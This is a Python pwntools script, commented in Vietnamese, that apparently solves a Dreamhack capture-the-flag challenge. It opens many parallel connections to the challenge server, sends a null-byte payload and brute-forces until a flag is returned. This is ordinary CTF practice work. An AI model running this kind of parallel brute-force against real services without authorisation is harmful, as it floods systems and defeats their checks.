from pwn import *
from multiprocessing import Pool, Manager

# --- Cấu hình ---
HOST = "host8.dreamhack.games"
PORT = 12297
NUM_WORKERS = 32

found_flag = Manager().Event()

def attempt(worker_id):
    """
    Hàm này được thực thi bởi mỗi tiến trình worker.
    Nó thực hiện một lần thử kết nối và kiểm tra.
    """
    # Nếu một worker khác đã tìm thấy flag, không cần thử nữa
    if found_flag.is_set():
        return None

    log.info(f"Worker {worker_id}: Attempting...")
    
    try:
        # Đặt timeout để tránh bị treo vô hạn
        r = remote(HOST, PORT, timeout=5)
        
        # Thử gửi payload \x00
        r.sendafter(b'can u guess me?\n', b'\0')
        
        # Đọc phản hồi. Dùng recv(1024) thay vì recvall để tránh bị treo
        # nếu server không đóng kết nối ngay lập tức.
        res = r.recv(1024)
        r.close()
        
        # Kiểm tra xem có flag trong phản hồi không
        # "DH{" là định dạng phổ biến của Dreamhack flags
        if b'DH{' in res:
            log.success(f"Worker {worker_id}: Flag found!")
            print("="*50)
            print(res.decode(errors='ignore'))
            print("="*50)
            # Đặt cờ để báo cho các worker khác dừng lại
            found_flag.set()
            return res # Trả về flag
            
    except Exception as e:
        # Bỏ qua lỗi kết nối, timeout, etc. và để worker thử lại
        log.warning(f"Worker {worker_id}: An error occurred: {e}")
        
    return None


if __name__ == "__main__":
    # Tắt logging mặc định của pwntools để không bị rối màn hình
    context.log_level = 'error'

    print(f"[*] Starting brute-force with {NUM_WORKERS} parallel workers...")
    
    # Tạo một Pool với số lượng worker đã định
    with Pool(processes=NUM_WORKERS) as pool:
        # Chạy một vòng lặp vô hạn, mỗi lần tạo ra một loạt các tác vụ mới
        # cho đến khi tìm thấy flag.
        while not found_flag.is_set():
            # map_async sẽ không block và chạy các tác vụ trên các worker
            # range(NUM_WORKERS) chỉ để cung cấp ID cho mỗi worker
            pool.map_async(attempt, range(NUM_WORKERS))
            
            # Chờ một chút trước khi bắt đầu một loạt thử mới
            # để tránh tạo ra quá nhiều tiến trình cùng lúc
            sleep(0.1)
    
    print("[*] Brute-force finished. Flag should be printed above.")